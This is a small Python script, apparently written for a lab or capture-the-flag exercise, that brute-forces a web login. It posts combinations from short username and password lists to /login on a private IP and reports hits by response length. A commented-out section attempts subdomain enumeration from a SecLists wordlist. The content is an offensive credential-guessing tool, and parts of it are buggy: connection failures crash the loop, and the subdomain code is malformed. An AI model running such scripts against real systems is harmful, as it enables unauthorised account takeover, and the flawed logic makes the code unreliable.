import requests
import re
from urllib.parse import parse_qs, urlparse

username_dic = ["root", "admin", "user"]
password_dic = ["root", "password", "12345"]

target_url = "http://10.10.74.113"


def request(data):
    try:
        return requests.post(f"{target_url}/login", data=data)
    except requests.exceptions.ConnectionError:
        pass


for user_list in username_dic:
    for pass_list in password_dic:
        creds = {
            "username": user_list,
            "password": pass_list
        }

        response = request(creds)
        # parsed = urlparse(response.url)
        # parsed_qs = parse_qs(parsed.query)["login"][0]

        len_result = len(response.content)

        if len_result == 2354:
            print(f"Trying, {user_list}:{pass_list}")
        else:
            print(f"username: {user_list},"
                  f"password: {pass_list}")

# with open("/opt/seclists/subdomains-top1million-5000.txt", "r") as wordlists:
#     for line in wordlists:
#         word = line.strip()
#         test_url = f"{word}.{target_url}"
#         response = request(test_url)
#         if response:
#             print(f"[+]  Discovered subdomain --> {test_url}")
